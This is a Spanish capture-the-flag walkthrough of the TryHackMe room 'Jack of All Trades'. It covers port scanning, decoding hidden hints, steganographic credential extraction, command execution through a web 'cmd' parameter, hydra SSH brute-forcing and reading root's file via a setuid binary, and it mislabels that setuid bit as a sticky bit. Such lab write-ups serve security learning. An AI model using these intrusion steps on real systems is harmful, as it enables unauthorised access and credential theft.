---
title : "Jack of All Trades - Write Up - Español"
date : 2021-07-04T14:31:31+02:00
author : "Lanfran02"
cover : "cover.jpeg"
useRelativeCover : true
description : "Máquina de nivel fácil en TryHackMe."
tags : ["strings","stego","RCE","steghide","TryHackMe"]
---

| Link | Nivel | Creador |
|------|-------|---------|
| [Aquí](https://tryhackme.com/room/jackofalltrades)  | Fácil  |  [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle)  |

## Reconocimiento

Como de costumbre, usando `nmap` obtenemos los puertos abiertos de la máquina.

Pero obtenemos algo bastante inusual.

```bash
╰─ lanfran@parrot ❯ map 10.10.22.246                                                                                               ─╯
[sudo] password for lanfran: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 14:32 CEST
Nmap scan report for 10.10.22.246
Host is up (0.058s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.85 seconds
```

¡Conseguimos los puertos cambiados!
El `puerto SSH es el 80`.
Y el `puerto web es el 22`.

¡Es una buena manera de pu&$\*!# a algunas personas despistadas!

Analicemos el servidor web con `gobuster`

```bash
╰─ lanfran@parrot ❯ curl http://10.10.22.246:22/                                                                                                                              ─╯
<html>
	<head>
		<title>Jack-of-all-trades!</title>
		<link href="assets/style.css" rel=stylesheet type=text/css>
	</head>
	<body>
		<img id="header" src="assets/header.jpg" width=100%>
		<h1>Welcome to Jack-of-all-trades!</h1>
		<main>
			<p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
			<p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
			<p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
			<p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
			<img src="assets/stego.jpg">
			<p>I make a lot of models myself, but I also do toys, like this one:</p>
			<img src="assets/jackinthebox.jpg">
			<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZX[REDACTADO]Nzd29yZDogdT9XdEtTcmFxCg== -->
			<p>I hope you choose to employ me. I love making new friends!</p>
			<p>Hope to see you soon!</p>
			<p id="signature">Jack</p>
		</main>
	</body>
</html>
```
Tenemos buena información aquí:
- Obtenemos un texto codificado aquí.
- Encontramos un nuevo endpoint `recovery.php`.

1. ¡Necesitamos decodificar el texto, así que vamos a usar [cyberchef](https://gchq.github.io/CyberChef/)!
Para decodificarlo necesitamos usar `Base64`

Y recibimos un mensaje:
`Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: [REDACTADO](
¡Recuerde desearle lo mejor a Johny Graves con su búsqueda de trabajo en cripto! ¡Sus sistemas de codificación son increíbles! También debes recordar tu contraseña: [REDACTADO])`

¡Bien! Tenemos una contraseña. Dejémoslo para más tarde.


2. Usando curl para navegar, obtenemos también un texto codificado oculto en el código fuente.
```bash
╰─ lanfran@parrot ❯ curl http://10.10.22.246:22/recovery.php                                                                                                                  ─╯
		
<!DOCTYPE html>
<html>
	<head>
		<title>Recovery Page</title>
		<style>
			body{
				text-align: center;
			}
		</style>
	</head>
	<body>
		<h1>Hello Jack! Did you forget your machine password again?..</h1>	
		<form action="/recovery.php" method="POST">
			<label>Username:</label><br>
			<input name="user" type="text"><br>
			<label>Password:</label><br>
			<input name="pass" type="password"><br>
			<input type="submit" value="Submit">
		</form>
		<!-- GQ2TOMRXME3TE[REDACTADO]TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
		 
	</body>
</html>
```

¡Usemos [cyberchef](https://gchq.github.io/CyberChef/) nuevamente para decodificarlo!

La ruta de decodificación es `Base32 -> Hex -> ROT13`.

Y recibimos un mensaje:
`Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S`(
`Recuerde que las credenciales para el inicio de sesión de recuperación están ocultas en la página de inicio. Sé lo olvidadiza que eres, así que aquí tienes una pista: bit.ly/2TvYQ2S`)

## Acceso inicial - Usuario

Navegando a ese enlace, obtenemos una página de Stegosaurio de Wikipedia. ¿Quizás el creador nos está diciendo que usemos esteganografía?

¡Descarguemos todas las imágenes de la página web!

Después, ejecute `steghide` con la contraseña del "1er" punto, obtenemos un nuevo archivo:

```bash
╰─ lanfran@parrot ❯ steghide extract -sf header.jpg                                                                                                                                       ─╯
Enter passphrase: u[REDACTADO]
the file "cms.creds" does already exist. overwrite ? (y/n) y
wrote extracted data to "cms.creds".

╰─ lanfran@parrot ❯ cat cms.creds                                                                                                                                                         ─╯
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: [REDACTADO]
```
¡Woohooo! ¡Obtenemos la contraseña del usuario para `recovery.php`!

Así que iniciemos sesión ahora. [Si recibe el error "ERR_UNSAFE_PORT" en su navegador, debe habilitar el puerto 22. Busco en Google una forma de solucionarlo, en Brave / Chrome debe pasar la bandera "--explicitly-allowed-ports=22 "]

¡Estupendo! Incluso podemos aprovechar el parámetro `cmd` para hacer RCE.

Después de buscar, encontramos un archivo con contraseñas.

`http://10.10.194.240:22/nnxhweOV/index.php?cmd=cat%20%20/home/jacks_password_list`

Descargue ese archivo y usémoslo, junto con `hydra` para forzar el SSH (recuerde que está en el puerto 80 :))

```bash
╰─ lanfran@parrot ❯ hydra -l jack -P pass.txt -s 80 ssh://10.10.22.246                                                                                                                    ─╯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-04 15:01:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:1/p:25), ~2 tries per task
[DATA] attacking ssh://10.10.22.246:80/
[80][ssh] host: 10.10.22.246   login: jack   password: [REDACTADO]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-04 15:01:19
```
Genial, ahora tenemos la contraseña, así que vamos a SSH.

```bash
╰─ lanfran@parrot ❯ ssh jack@10.10.22.246 -p 80                                                                                                                                           ─╯
jack@10.10.22.246's password: 
jack@jack-of-all-trades:~$ ls -la
total 312
drwxr-x--- 3 jack jack   4096 Feb 29  2020 .
drwxr-xr-x 3 root root   4096 Feb 29  2020 ..
lrwxrwxrwx 1 root root      9 Feb 29  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jack jack    220 Feb 29  2020 .bash_logout
-rw-r--r-- 1 jack jack   3515 Feb 29  2020 .bashrc
drwx------ 2 jack jack   4096 Feb 29  2020 .gnupg
-rw-r--r-- 1 jack jack    675 Feb 29  2020 .profile
-rwxr-x--- 1 jack jack 293302 Feb 28  2020 user.jpg
jack@jack-of-all-trades:~$ 
```

Vamos a usar "cat" para leer la flag del usua... La p\*\*\*, es una imagen. Descargámoslo a nuestra máquina local y leamos/copiemos la bandera.
_Recomiendo usar el lector de autoimagen del traductor de Google para copiar la bandera :)_

## Root

Al escanear la máquina, encontramos que el binario `strings` tiene el Sticky bit, por lo que podemos usarlo para leer el flag de root.

```bash
jack@jack-of-all-trades:~$ ls -la /usr/bin/strings 
-rwsr-x--- 1 root dev 27536 Feb 25  2015 /usr/bin/strings
jack@jack-of-all-trades:~$ /usr/bin/strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{[REDACTADO]}
```

¡Y hemos "rooteado" la máquina!

Eso es todo de mi parte, ¡espero que lo encuentre útil!